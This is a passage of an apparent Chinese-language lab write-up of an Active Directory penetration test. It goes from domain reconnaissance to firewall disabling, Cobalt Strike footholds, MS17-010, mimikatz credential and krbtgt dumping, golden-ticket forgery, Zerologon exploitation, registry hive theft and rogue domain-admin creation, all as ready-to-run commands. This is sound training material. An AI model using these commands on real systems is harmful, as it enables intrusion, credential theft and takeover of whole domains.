alt="image-20210802174020113"></p><blockquote><p>发现有域就可以进一步收集内网信息了，如果只有一个机器就直接提权然后就基本没有什么其他的事情了</p></blockquote></li><li><p>查看开放的端口（主要注意远程连接端口（22   3389）和可以利用的漏洞的端口）：<code>netstat -ano</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802180609270.png" alt="image-20210802180609270"></p></li><li><p>确定当前服务器是否有杀软（后期为工具做免杀）：<code>tasklist</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802174237882.png" alt="image-20210802174237882"></p></li><li><p>获取当前开启的服务（可能有服务能帮助提权）：<code>wmic service list brief</code>         <code>net start</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802175159585.png" alt="image-20210802175159585"></p></li><li><p>查看系统开机时间：<code>net statistics workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210802175707265.png" alt="image-20210802175707265"></p></li><li><p>查看启动程序信息：<code>wmic startup get command,caption</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803095350375.png" alt="image-20210803095350375"></p></li><li><p>查询本机上用户列表（没有包含域用户）：<code>net user</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803095935390.png" alt="image-20210803095935390"></p></li><li><p>获取本地管理员（包含域管理员）信息：<code>net localgroup administrators</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100235551.png" alt="image-20210803100235551"></p></li><li><p>查询本机共享列表：<code>net share</code>    <code>wmic share get name,path,status</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100551173.png" alt="image-20210803100551173"></p><blockquote><p>可以进行IPC等内网操作</p></blockquote></li><li><p>查询路由表及arp缓存表：<code>route print</code>  <code>arp -a</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803100836885.png" alt="image-20210803100836885"></p></li><li><p>关闭防火墙（需要管理员权限）：<code>netsh advfirewall set allprofiles state off</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101029730.png" alt="image-20210803101029730"></p></li><li><p>查看防火墙配置：<code>netsh firewall show config</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101228040.png" alt="image-20210803101228040"></p></li><li><p>开启远程端口（需要管理员权限）：<code>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803101516401.png" alt="image-20210803101516401"></p></li><li><p>查看远程连接端口：<code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></p></li></ol><blockquote><p>前期的本地信息收集包含计算机系统版本，网卡路由，防火墙信息，补丁，域，ARP缓存，路由，用户列表，管理员权限用户，也需要注意电脑上存有的敏感信息的文件</p><p>也有自动信息收集工具懒🐕可以考虑一下</p></blockquote><h5 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h5><h6 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a><strong>基本信息收集</strong></h6><blockquote><p>由上面的本地信息收集得知存在域，所以就继续进行域渗透</p></blockquote><ol><li><p>查看当前权限获取域SID（SID对域渗透有帮助）：<code>whoami /all</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102458768.png" alt="image-20210803102458768"></p></li><li><p>查询当前登录域及登录用户信息：<code>net config workstation</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102759673.png" alt="image-20210803102759673"></p></li><li><p>查看当前所属域（域控服务器会同时作为时间服务器使用）：<code>net time /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803102949200.png" alt="image-20210803102949200"></p></li><li><p>探测域内存活主机</p><ul><li><p>利用<code>nbtscan</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803103742640.png" alt="image-20210803103742640"></p><blockquote><p>发现三个域控</p></blockquote></li><li><p>利用ICMP协议探测：<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803104932946.png" alt="image-20210803104932946"></p></li><li><p>ARP扫描内网</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803104457305.png" alt="image-20210803104457305"></p><blockquote><p>收集到的存活主机信息：</p><p>10.10.3.5    LCDM123\MAINYU         SHARING DC</p><p>10.10.3.6    XIAOYU\ZIYU           SHARING DC</p><p>10.10.3.7    LCDM123\FUZHU          SHARING DC</p><p>10.10.3.128   XIAOYU\WEB           SHARING</p><p>10.10.3.16</p></blockquote></li></ul></li><li><p>主机端口信息收集</p><ul><li><p>telnet端口信息收集：<code>telnet ip port</code></p><blockquote><p>常见端口：22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432,53,161,137,139</p><p>这个方法比较慢，但是准确</p></blockquote></li><li><p>S扫描器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803110805230.png" alt="image-20210803110805230"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803110815940.png" alt="image-20210803110815940"></p><blockquote><p>扫描结果不是很齐全</p></blockquote></li><li><p>nmap（这个搭建代理再扫描内网比较方便）</p></li><li><p>使用Nishang</p></li><li><p>使用MSF</p></li><li><p>…………</p></li></ul></li><li><p>获取端口的Banner信息（客户端连接工具，NC）</p></li></ol><h6 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a><strong>域用户信息收集</strong></h6><ol><li><p>查询域：<code>net view /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112637819.png" alt="image-20210803112637819"></p></li><li><p>查询域内所有计算机：<code>net view /domain:XIAOYU</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112659327.png" alt="image-20210803112659327"></p></li><li><p>查询域内所有用户组列表：<code>net group /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803112758051.png" alt="image-20210803112758051"></p><blockquote><p>默认情况下Domain Admins和Enterprise Admins对域内所有域控制器有完全控制权限</p></blockquote></li><li><p>查询域内所有用户列表：<code>net group &quot;domain computers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113031102.png" alt="image-20210803113031102"></p></li><li><p>域密码策略：<code>net accounts /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113147707.png" alt="image-20210803113147707"></p></li><li><p>获取域信任信息：<code>nltest /domain_trusts</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113417757.png" alt="image-20210803113417757"></p><blockquote><p>win7 这个命令不行？？？？</p></blockquote></li><li><p>查找域控（需要属于域内的用户运行）：<code>net time /domain</code> </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803114605145.png" alt="image-20210803114605145"></p></li><li><p>查看域控制器组：<code>net group &quot;domain controllers&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803113654103.png" alt="image-20210803113654103"></p></li><li><p>域内用户列表：<code>net user /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803114713304.png" alt="image-20210803114713304"></p></li><li><p>获取域内用户的详细信息：<code>wmic useraccount get /all</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823124332827.png" alt="image-20210823124332827"></p></li><li><p>查看存在的用户：<code>dsquery user</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823124425459.png" alt="image-20210823124425459"></p><blockquote><p>无法允许？？？</p></blockquote></li><li><p>本地管理员组：<code>net localgroup administrators</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803115511194.png" alt="image-20210803115511194"></p></li><li><p>查询域管理员：<code>net group &quot;domain admins&quot; /domain</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803140643801.png" alt="image-20210803140643801"></p></li></ol><h6 id="收集定位域管理"><a href="#收集定位域管理" class="headerlink" title="收集定位域管理"></a><strong>收集定位域管理</strong></h6><ol><li><p>使用<code>psloggedon</code>查询谁登录了远程计算机资源</p></li><li><p>使用<code>PVEFindADUser</code>查询查询活动目录用户登录位置，枚举域用户，查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户（需要管理员权限）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803143758539.png" alt="image-20210803143758539"></p><blockquote><p>未查询到任何有用的东西</p></blockquote></li><li><p>使用<code>netview</code>查询（大部分功能不需要管理员权限）</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803142542668.png" alt="image-20210803142542668"></p><blockquote><p>子域控上 发现了二级网络：10.10.21.5</p></blockquote></li><li><p>使用<code>powerView</code>脚本（常用）</p><p><code>powerView.ps1</code>是一款依赖powershell和wmi对内网进行查询的常用渗透测试脚本，集成在powersploit工具包中，是一个收集域信息很好用的脚本。</p></li></ol><h6 id="查找域控的用户会话"><a href="#查找域控的用户会话" class="headerlink" title="查找域控的用户会话"></a><strong>查找域控的用户会话</strong></h6><p>内网渗透中，通常围绕着收集明文凭据或者通过mimikatz提权等方法，如果内网环境非常的复杂，我们无法立即在用有权限的系统中获得域管理员进程，那么通常可以采用的方法是：在跳板机之间跳转，直至获得域管理员权限，同时进行一些分析工具，找到渗透测试的路径。</p><ol><li><p>本机检测：<code>tasklist -v</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803144742505.png" alt="image-20210803144742505"></p></li><li><p>查询域控制器和域管理员列表：</p><p><code>net group &quot;Domain Controllers&quot; /domain</code> </p><p><code>net group &quot;Domain Admins&quot; /domain</code></p></li><li><p>收集所有活动域的会话列表</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210803145339427.png" alt="image-20210803145339427"></p></li></ol><blockquote><p>收集到的信息很多并且比较杂乱，收集完成之后需要单独整理一下，建议后面写一个模板方便整理信息</p><p>内网环境存在域并且存在多级内网，并且可以大致画出内网一部分拓扑</p><p>信息收集的深度和广度决定了后期的发展，收集到的信息的整理也是十分重要的。</p></blockquote><h4 id="CS渗透"><a href="#CS渗透" class="headerlink" title="CS渗透"></a>CS渗透</h4><p>上线CS的准备工作</p><ol><li><p>建立监听</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130044870.png" alt="image-20210823130044870"></p></li><li><p>生成payload</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130240253.png" alt="image-20210823130240253"></p></li><li><p>上传exe，CS上线</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130457523.png" alt="image-20210823130457523"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823130508183.png" alt="image-20210823130508183"></p></li></ol><p>利用CS提权</p><blockquote><p>推荐两个CS的插件</p><p><a href="https://github.com/z1un/Z1-AggressorScripts">https://github.com/z1un/Z1-AggressorScripts</a></p><p><a href="https://github.com/lintstar/LSTAR">https://github.com/lintstar/LSTAR</a></p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823142539507.png" alt="image-20210823142539507"></p><blockquote><p>成功获取到了web服务器的管理员权限</p></blockquote><p>下一步准备获取子域控的权限，先搭建隧道，然后利用web服务器当作跳板机攻击子域控</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144034038.png" alt="image-20210823144034038"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144020628.png" alt="image-20210823144020628"></p><p>检测隧道</p><p>配置<code>sudo vim /etc/proxychains.conf</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823144438818.png" alt="image-20210823144438818"></p><blockquote><p>隧道搭建成功</p></blockquote><p>利用代理打开MSF：<code>proxychains msfconsole</code> 然后确认是否有MS17-010漏洞</p><blockquote><p>也可以进去后运行</p><p>setg Proxies socks5:192.168.1.15:6000</p><p>setg ReverseAllowProxy true</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823145340538.png" alt="image-20210823145340538"></p><p>利用漏洞获取子域控权限</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823145610266.png" alt="image-20210823145610266"></p><p>利用命令自己创建一个域控用户，并且将用户加入域管组</p><p><code>net user lcdm lcdm123 /add /doamin</code>  添加域用户</p><p><code>net group &quot;Domain Admins&quot; lcdm /add /domain</code>  将用户加入用户组</p><p><code>net user lcdm123</code>  检查用户是否存在</p><blockquote><p><del>添加失败，原因不清楚</del>  后期发现是因为用户的密码不够复杂</p></blockquote><p>开启远程桌面端口</p><p><code>reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</code> 设置远程端口</p><p><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code> 开启远程桌面</p><p><code>set command &quot;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow&quot;</code> 防火墙放行3389</p><blockquote><p>这个是也打开失败了？？？ 也没有具体回显，不清楚原因</p></blockquote><p>先把子域控放在一边，回到CS选取另外的方法，先抓取本地用户密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160344639.png" alt="image-20210823160344639"></p><p>开启远程桌面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160426190.png" alt="image-20210823160426190"></p><p>登录web服务器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823160831478.png" alt="image-20210823160831478"></p><blockquote><p>当前用户不能远程桌面</p></blockquote><p>解决办法<code> net localgroup &quot;Remote Users&quot; XIAOYU\web /add</code> </p><blockquote><p>添加时需要填写完整的用户信息，包括所在的域 </p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823161221182.png" alt="image-20210823161221182"></p><p>连接成功</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823161421368.png" alt="image-20210823161421368"></p><p>继续获取域控权限，检查主机是否存在MS14-068漏洞</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823165525149.png" alt="image-20210823165525149"></p><blockquote><p>失败了………… 继续想其他办法</p></blockquote><p>尝试重新回到添加用户的地方，对于用户添加失败那里，猜想会不会是密码的问题，因为刚刚也有这个问题，果然把密码变复杂之后就可以成功添加用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172216247.png" alt="image-20210823172216247"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172227624.png" alt="image-20210823172227624"></p><blockquote><p>这里加入管理员组好像还是没有成功</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823172248834.png" alt="image-20210823172248834"></p><p>接下来是继续尝试开启远程桌面</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">REG <span class="hljs-builtin-name">ADD</span> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure><blockquote><p>本地可以执行但是远程不能执行？ 原因不明</p><p>先直接在本地开启吧，然后把添加的用户加入域管理员组，往后渗透吧:sob:</p><p>师傅的新思路：将命令写入bat文件，然后执行bat，这个平时在linux上利用较多在Windows就没有反应过来:pig:</p></blockquote><p>利用隧道在本地上连接远程桌面后报错</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210823174550341.png" alt="image-20210823174550341"></p><p>直接套娃，利用web服务器的远程桌面连接域控的远程桌面</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824101043489.png" alt="image-20210824101043489"></p><blockquote><p><del>到这里存在的问题</del></p><ol><li><del>远程桌面是我主动直接在子域控上开启的</del></li><li><del>添加用户成功，但是用户添加到域管理员组失败，我直接在本机上添加，然后继续往后测试</del></li></ol><p>还需要多积累点windows漏洞</p></blockquote><p>MS17-010利用失败可以选择使用下面的方法攻击</p><p><strong>CVE-2020-1472</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826140535452.png" alt="image-20210826140535452"></p><blockquote><p>存在CVE-2020-1472漏洞，可以直接利用，具体利用在攻击独立域控板块，获取到shell后可以直接添加用户开启远程桌面等</p></blockquote><p>创建域管理员用户后，将WEB服务器与子域控建立<code>ipc</code>连接</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\10.10.3.6\ipc$  <span class="hljs-string">&quot;password&quot;</span> /user:username 建立连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> 查看连接<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824102350664.png" alt="image-20210824102350664"></p><p><strong>子域上线CS</strong></p><p>先建立一个监听</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824110008260.png" alt="image-20210824110008260"></p><p><img src="D:\markdown\image-20210824110031253.png" alt="image-20210824110031253"></p><p>利用这个监听器生成一个payload，然后上传到web服务器，之后利用<code>ipc$</code>上传到子域控服务器，利用远程桌面执行payload，子域就上线了</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824110423622.png" alt="image-20210824110423622"></p><h4 id="获取父域权限"><a href="#获取父域权限" class="headerlink" title="获取父域权限"></a>获取父域权限</h4><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz.exe<br>lsadump::lsa /patch /<span class="hljs-symbol">user:</span>lcdm123<span class="hljs-variable">$ </span> <span class="hljs-comment">#lcdm123是父域名(lcdm123.com)前面的那部分</span><br>lsadump::trust /patch<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133332369.png" alt="image-20210824133332369"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133034799.png" alt="image-20210824133034799"></p><blockquote><p>XIAOYU       S-1-5-21-2845514817-4131120174-542881076</p><p>LCDM123    S-1-5-21-2230540616-3190751709-2169179123</p><p>NTLM     715e932ab28c6dfc6ebe0ef915f6e26a</p></blockquote><p>接着继续获取krbtgt散列值</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-attr">lsadump:</span>:lsa <span class="hljs-regexp">/patch /</span><span class="hljs-attr">user:</span>krbtgt<br><span class="hljs-attr">sekurlsa:</span>:krbtgt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824133911902.png" alt="image-20210824133911902"></p><p>伪造黄金票据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:当前域名 /sid:当前SID /sids:目标域SID-<span class="hljs-number">519</span> /krbtgt: krbtgt散列 /ptt<br><span class="hljs-attribute">Kerberos</span>::golden /user:administrator /domain:xiaoyu.lcdm<span class="hljs-number">123</span>.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2845514817</span>-<span class="hljs-number">4131120174</span>-<span class="hljs-number">542881076</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2230540616</span>-<span class="hljs-number">3190751709</span>-<span class="hljs-number">2169179123</span>-<span class="hljs-number">519</span> /krbtgt:<span class="hljs-number">7</span>f<span class="hljs-number">5</span>c<span class="hljs-number">19853</span>ad<span class="hljs-number">2</span>ead<span class="hljs-number">5</span>a<span class="hljs-number">20</span>f<span class="hljs-number">32864</span>ebb<span class="hljs-number">3210</span> /ptt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824134706936.png" alt="image-20210824134706936"></p><p>尴尬好像还是拒绝访问</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824135858818.png" alt="image-20210824135858818"></p><blockquote><p>说明以上步骤是有问题的</p></blockquote><blockquote><p>有个小疑问？？ 怎么查父域的计算机名</p></blockquote><p><del>这里先暂停，继续往后面做</del></p><p><strong>CVE-2020-1742</strong></p><p>利用<code>mimikatz</code>检查漏洞是否存在</p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:mainyu$&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826140919742.png" alt="image-20210826140919742"></p><p>置零攻击<code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$ /exploit&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826141153288.png" alt="image-20210826141153288"></p><p>抓取置零后的hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826142300737.png" alt="image-20210826142300737"></p><p>连接上shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826142557317.png" alt="image-20210826142557317"></p><blockquote><p>此时可以任意添加用户，开启远程功能了</p></blockquote><p>下载sam文件（恢复原hash）并且添加域管理员用户</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143121418.png" alt="image-20210826143121418"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143208733.png" alt="image-20210826143208733"></p><p>恢复hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143647194.png" alt="image-20210826143647194"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826143702610.png" alt="image-20210826143702610"></p><blockquote><p>恢复成功</p></blockquote><p>建立IPC$</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826144643007.png" alt="image-20210826144643007"></p><blockquote><p>这个又是什么问题？？？ 未解决！！！</p></blockquote><h4 id="攻击独立域控"><a href="#攻击独立域控" class="headerlink" title="攻击独立域控"></a>攻击独立域控</h4><p>发现主机存在其他网段，所以继续扫描内网，发现新主机</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824143350418.png" alt="image-20210824143350418"></p><p>搭建二级代理进行攻击</p><blockquote><p>ew二级代理失败……  尝试其他办法</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824151347382.png" alt="image-20210824151347382"></p><p>使用FRP搭建二级代理</p><blockquote><p>需要格外注意各内容填写，根据之前自己总结的搭建，不会出什么大问题</p></blockquote><p><strong>开始攻击独立域</strong></p><p><del>MS17-010</del> 失败</p><p>首先为MSF设置代理</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163753996.png" alt="image-20210824163753996"></p><p>测试是否存在MS17-010</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163910769.png" alt="image-20210824163910769"></p><p>测试执行命令</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824163948984.png" alt="image-20210824163948984"></p><blockquote><p>还存在一个内网IP……</p></blockquote><p>使用MSF尝试获取shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210824170723112.png" alt="image-20210824170723112"></p><blockquote><p>失败了，尝试添加用户也遇到了之前的情况，远程桌面也不能打开，应该是命令存在问题吧</p></blockquote><p><strong>CVE-2020-1472</strong></p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826095722660.png" alt="image-20210826095722660"></p><blockquote><p>测试得出漏洞是存在的</p></blockquote><p>使用mimikatz利用CVE-2020-1472将域控密码设置为空</p><p><code>shell mimikatz &quot;lsadump::zerologon /target:10.10.21.2 /account:CAIWUYU$ /exploit&quot; &quot;exit&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826100141094.png" alt="image-20210826100141094"></p><blockquote><p>成功置空</p></blockquote><p>使用impacket工具包攻击</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxychains git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/SecureAuthCorp/impacket.git<br><span class="hljs-keyword">cd</span> impacket/<br>sudo pip3 install .<br>sudo <span class="hljs-keyword">python3</span> setup.<span class="hljs-keyword">py</span> install<br><br>pip3安装：<br>wget http<span class="hljs-variable">s:</span>//bootstrap.pypa.io/<span class="hljs-built_in">get</span>-pip.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python3</span> <span class="hljs-built_in">get</span>-pip.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826102318636.png" alt="image-20210826102318636"></p><p>下载sam文件为下一步恢复机器密码做准备</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826102936705.png" alt="image-20210826102936705"></p><p>问题来了，居然不能下载<code>.save</code>文件</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> HKLM\SYSTEM <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br>reg <span class="hljs-built_in">save</span> HKLM\SAM sam.<span class="hljs-built_in">save</span><br>reg <span class="hljs-built_in">save</span> HKLM\SECURITY security.<span class="hljs-built_in">save</span><br><br><span class="hljs-built_in">get</span> <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">get</span> sam.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">get</span> security.<span class="hljs-built_in">save</span><br><br><span class="hljs-built_in">del</span> /f <span class="hljs-built_in">system</span>.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">del</span> /f sam.<span class="hljs-built_in">save</span><br><span class="hljs-built_in">del</span> /f security.<span class="hljs-built_in">save</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826105746880.png" alt="image-20210826105746880"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826104057033.png" alt="image-20210826104057033"></p><blockquote><p>猜测有可能是多级代理的问题吧，网络不稳导致下载失败</p><p>错误原因：impacket最新包自身问题，使用之前的版本即可</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826105721993.png" alt="image-20210826105721993"></p><p>利用 shell 添加一个域管理员用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> user </span>lcdm1 hongrisec@2021 /<span class="hljs-builtin-name">add</span> /domain<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> lcdm1 /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826111805204.png" alt="image-20210826111805204"></p><p>利用下载到的文件获取到原 hash</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826110244043.png" alt="image-20210826110244043"></p><p>恢复原密码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826111140817.png" alt="image-20210826111140817"></p><p>建立 IPC，传入上线 CS</p><p><code>net use \\10.10.21.2\ipc$ &quot;hongrisec@2021&quot; /user:lcdm1</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826112116377.png" alt="image-20210826112116377"></p><p>使用 PsExec 获取到财务域的 Shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826134343505.png" alt="image-20210826134343505"></p><p>虽然连上了但是 CS 一直不能上线</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210826134903610.png" alt="image-20210826134903610"></p><blockquote><p><del>难道是多级代理的问题导致弹不出来？？？ 但是这个是使用的监听器应该和代理没有关系，应该是创建payload的手法有问题</del></p></blockquote><p>上面可以直接在CS中生成 spawn 然后利用添加的用户和密码即可上线 CS</p><p>拿到了独立域控的权限后这个域就基本全部沦陷了，这个域内还有一个主机，就可以直接控制了，大致就攻击到这里了</p><h2 id="问题总结"><a href="#问题总结" class="headerlink" 